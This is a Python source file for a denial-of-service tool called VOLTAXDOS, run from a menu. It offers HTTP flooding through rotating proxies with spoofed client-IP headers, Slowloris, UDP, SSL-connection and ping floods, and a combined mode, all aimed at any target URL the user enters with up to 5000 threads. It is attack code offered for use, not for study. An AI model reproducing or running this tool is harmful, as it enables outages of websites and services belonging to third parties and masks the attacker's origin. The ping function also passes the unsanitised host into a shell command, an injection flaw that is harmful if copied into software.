#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
TOOL: VOLTAXDOS v4.0 - ULTRA BRUTAL
AUTHOR: RynnMMK
FITUR: Multi Attack (HTTP Flood, Slowloris, UDP, ICMP, SSL DDoS)
TERMUX NON-ROOT FRIENDLY
"""

import sys
import os
import time
import random
import threading
import socket
import ssl
import hashlib
import base64
import json
import struct
from urllib.parse import urlparse
from datetime import datetime

try:
    import requests
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    os.system('pip install requests colorama')
    print("[+] Installed dependencies, restart tool.")
    sys.exit(1)

# ============================================================
# GLOBAL
# ============================================================
ATTACK_RUNNING = False
REQUEST_COUNT = 0
FAILED_COUNT = 0
LOCK = threading.Lock()
PROXY_LIST = []
USE_PROXY = False

# ============================================================
# BANNER BRUTAL
# ============================================================
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(Fore.RED + """
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ██╗   ██╗ ██████╗ ██╗     ████████╗ █████╗ ██╗  ██╗           ║
║   ██║   ██║██╔═══██╗██║     ╚══██╔══╝██╔══██╗╚██╗██╔╝           ║
║   ██║   ██║██║   ██║██║        ██║   ███████║ ╚███╔╝            ║
║   ╚██╗ ██╔╝██║   ██║██║        ██║   ██╔══██║ ██╔██╗            ║
║    ╚████╔╝ ╚██████╔╝███████╗   ██║   ██║  ██║██╔╝ ██╗           ║
║     ╚═══╝   ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝           ║
║                                                                   ║
║          VOLTAXDOS v4.0 - ULTRA BRUTAL                          ║
║          Author: RynnMMK                                        ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)
    print(Fore.RED + "[+] VOLTAXDOS - ULTRA BRUTAL EDITION")
    print(Fore.YELLOW + "[!] Multi Attack | Proxy Rotator | SSL DDoS")
    print(Fore.MAGENTA + "[!] Press Ctrl+C to stop anytime\n")

# ============================================================
# PROXY
# ============================================================
def load_proxies(filename="proxies.txt"):
    global PROXY_LIST
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    PROXY_LIST.append(line)
        if PROXY_LIST:
            print(Fore.GREEN + f"[+] Loaded {len(PROXY_LIST)} proxies")
            return True
        return False
    except:
        return False

def get_proxy():
    if PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None

# ============================================================
# HEADERS
# ============================================================
UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1) Mobile/15E148",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

REF = [
    "https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/",
    "https://twitter.com/", "https://www.instagram.com/", "https://www.youtube.com/",
    "https://github.com/", "https://www.reddit.com/",
]

def headers(ip=None):
    if not ip:
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    return {
        'User-Agent': random.choice(UA),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'X-Forwarded-For': ip,
        'X-Real-IP': ip,
        'Referer': random.choice(REF),
    }

# ============================================================
# ATTACK TYPES
# ============================================================

# --- HTTP FLOOD ---
def http_flood_worker(target, tid):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT
    session = requests.Session()
    while ATTACK_RUNNING:
        try:
            proxy = get_proxy() if USE_PROXY else None
            if proxy:
                session.proxies = {'http': proxy, 'https': proxy}
                ip = proxy.split(':')[0].replace('http://', '').replace('https://', '')
            else:
                ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            path = random.choice(['/', '/index.html', '/home', '/login', '/api/v1/data', '/products', '/admin', '/.env'])
            url = target.rstrip('/') + path
            params = {'t': int(time.time()*1000), 'r': random.randint(1,99999)}
            hdrs = headers(ip)
            
            if random.choice([0,1]) == 0:
                resp = session.get(url, headers=hdrs, params=params, timeout=3)
            else:
                resp = session.post(url, headers=hdrs, params=params, data={'id': random.randint(1,9999)}, timeout=3)
            
            with LOCK:
                REQUEST_COUNT += 1
            time.sleep(random.uniform(0.0001, 0.001))
        except:
            with LOCK:
                FAILED_COUNT += 1
            time.sleep(0.01)

# --- SLOWLORIS ---
def slowloris_worker(target, tid):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT
    parsed = urlparse(target)
    host = parsed.netloc
    port = 443 if parsed.scheme == 'https' else 80
    path = random.choice(['/', '/index.html', '/home', '/login'])
    
    while ATTACK_RUNNING:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            if parsed.scheme == 'https':
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
            
            req = f"GET {path} HTTP/1.1\r\n"
            req += f"Host: {host}\r\n"
            req += f"User-Agent: {random.choice(UA)}\r\n"
            req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            req += "Accept-Encoding: gzip, deflate\r\n"
            for _ in range(random.randint(5, 15)):
                req += f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n"
            req += "\r\n"
            sock.send(req.encode())
            time.sleep(random.uniform(10, 30))
            sock.close()
            with LOCK:
                REQUEST_COUNT += 1
        except:
            with LOCK:
                FAILED_COUNT += 1
            time.sleep(0.1)

# --- UDP FLOOD ---
def udp_worker(target, tid):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT
    parsed = urlparse(target)
    host = parsed.netloc.split(':')[0]
    port = 80
    if ':' in parsed.netloc:
        try:
            port = int(parsed.netloc.split(':')[1])
        except:
            pass
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = b'\x00' * 1400
    while ATTACK_RUNNING:
        try:
            sock.sendto(packet, (host, port))
            with LOCK:
                REQUEST_COUNT += 1
            time.sleep(random.uniform(0.0001, 0.0005))
        except:
            with LOCK:
                FAILED_COUNT += 1
            time.sleep(0.01)

# --- SSL RENEGOTIATION ---
def ssl_worker(target, tid):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT
    parsed = urlparse(target)
    host = parsed.netloc.split(':')[0]
    port = 443
    
    while ATTACK_RUNNING:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=host)
            
            for _ in range(random.randint(3, 10)):
                ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                time.sleep(0.1)
            ssl_sock.close()
            with LOCK:
                REQUEST_COUNT += 1
        except:
            with LOCK:
                FAILED_COUNT += 1
            time.sleep(0.05)

# --- ICMP FLOOD (Non-root via raw socket skip, use ping alternative) ---
def icmp_worker(target, tid):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT
    parsed = urlparse(target)
    host = parsed.netloc.split(':')[0]
    
    while ATTACK_RUNNING:
        try:
            os.system(f"ping -c 1 -W 1 {host} > /dev/null 2>&1")
            with LOCK:
                REQUEST_COUNT += 1
            time.sleep(random.uniform(0.001, 0.005))
        except:
            with LOCK:
                FAILED_COUNT += 1
            time.sleep(0.05)

# ============================================================
# MULTI LAYER ATTACK
# ============================================================
def multi_worker(target, tid):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT
    attack_types = [http_flood_worker, slowloris_worker, udp_worker, ssl_worker]
    while ATTACK_RUNNING:
        try:
            random.choice(attack_types)(target, tid)
        except:
            time.sleep(0.1)

# ============================================================
# ENGINE
# ============================================================
def start_attack(target, threads, duration, attack_type, use_proxy=False):
    global ATTACK_RUNNING, REQUEST_COUNT, FAILED_COUNT, USE_PROXY
    ATTACK_RUNNING = True
    REQUEST_COUNT = 0
    FAILED_COUNT = 0
    USE_PROXY = use_proxy
    
    attack_map = {
        '1': http_flood_worker,
        '2': slowloris_worker,
        '3': udp_worker,
        '4': ssl_worker,
        '5': icmp_worker,
        '6': multi_worker,
    }
    worker = attack_map.get(attack_type, http_flood_worker)
    
    print(f"\n[+] Target: {target}")
    print(f"[+] Threads: {threads}")
    print(f"[+] Duration: {'Unlimited' if duration == 0 else str(duration) + 's'}")
    print(f"[+] Proxy: {'ON (' + str(len(PROXY_LIST)) + ' proxies)' if use_proxy else 'OFF'}")
    print("[!] Launching attack... Ctrl+C to stop\n")
    
    for i in range(threads):
        t = threading.Thread(target=worker, args=(target, i))
        t.daemon = True
        t.start()
        time.sleep(0.001)
    
    start_time = time.time()
    last_report = start_time
    
    try:
        while ATTACK_RUNNING:
            elapsed = int(time.time() - start_time)
            if time.time() - last_report >= 1.0:
                with LOCK:
                    rps = REQUEST_COUNT / max(elapsed, 1)
                    sys.stdout.write(Fore.CYAN + f"\r[+] Req: {REQUEST_COUNT} | " +
                                     Fore.YELLOW + f"RPS: {rps:.0f} | " +
                                     Fore.RED + f"Fail: {FAILED_COUNT} | " +
                                     Fore.WHITE + f"Time: {elapsed}s")
                    sys.stdout.flush()
                last_report = time.time()
            if duration > 0 and elapsed >= duration:
                ATTACK_RUNNING = False
                break
            time.sleep(0.1)
    except KeyboardInterrupt:
        ATTACK_RUNNING = False
        print("\n[!] Stopped by user.")
    
    sys.stdout.write('\r' + ' ' * 80 + '\r')
    sys.stdout.flush()
    elapsed = int(time.time() - start_time)
    print("\n\n" + "="*50)
    print(Fore.GREEN + "[+] FINAL REPORT")
    print("="*50)
    print(f"[+] Total: {REQUEST_COUNT}")
    print(f"[+] Failed: {FAILED_COUNT}")
    if REQUEST_COUNT > 0:
        print(f"[+] Success Rate: {(REQUEST_COUNT - FAILED_COUNT) / REQUEST_COUNT * 100:.1f}%")
        print(f"[+] Avg RPS: {REQUEST_COUNT / max(elapsed, 1):.1f}")
    print(f"[+] Duration: {elapsed}s")

# ============================================================
# MAIN MENU
# ============================================================
def main():
    banner()
    load_proxies()
    
    while True:
        print(Fore.CYAN + "\n╔═══════════════════════════════════════════╗")
        print(Fore.CYAN + "║          ATTACK MENU                     ║")
        print(Fore.CYAN + "╚═══════════════════════════════════════════╝")
        print(Fore.WHITE + "  [1] HTTP Flood (Proxy Rotator)")
        print(Fore.WHITE + "  [2] Slowloris (Keep-Alive)")
        print(Fore.WHITE + "  [3] UDP Flood")
        print(Fore.WHITE + "  [4] SSL Renegotiation")
        print(Fore.WHITE + "  [5] ICMP Flood (Ping)")
        print(Fore.WHITE + "  [6] Multi-Layer (ALL)")
        print(Fore.WHITE + "  [7] Load Proxies")
        print(Fore.WHITE + "  [8] Exit")
        print()
        
        choice = input(Fore.YELLOW + "[?] Select: " + Fore.RESET).strip()
        if choice == '8':
            print("[!] Exiting...")
            sys.exit(0)
        if choice == '7':
            fn = input("[?] Proxy file (default proxies.txt): ").strip() or "proxies.txt"
            load_proxies(fn)
            input("[+] Press Enter...")
            continue
        if choice not in ['1','2','3','4','5','6']:
            print(Fore.RED + "[!] Invalid.")
            continue
        
        target = input(Fore.YELLOW + "[?] Target URL: " + Fore.RESET).strip()
        if not target.startswith(('http://','https://')):
            target = 'http://' + target
        
        threads = input(Fore.YELLOW + "[?] Threads (default 500): " + Fore.RESET).strip()
        threads = int(threads) if threads.isdigit() else 500
        if threads > 5000:
            threads = 5000
        
        duration = input(Fore.YELLOW + "[?] Duration sec (0=unlimited): " + Fore.RESET).strip()
        duration = int(duration) if duration.isdigit() else 0
        
        use_proxy = input(Fore.YELLOW + "[?] Use proxy? (y/n): " + Fore.RESET).strip().lower() == 'y'
        if use_proxy and not PROXY_LIST:
            print(Fore.RED + "[!] No proxies loaded.")
            use_proxy = False
        
        start_attack(target, threads, duration, choice, use_proxy)
        input("\nPress Enter to menu...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit(0)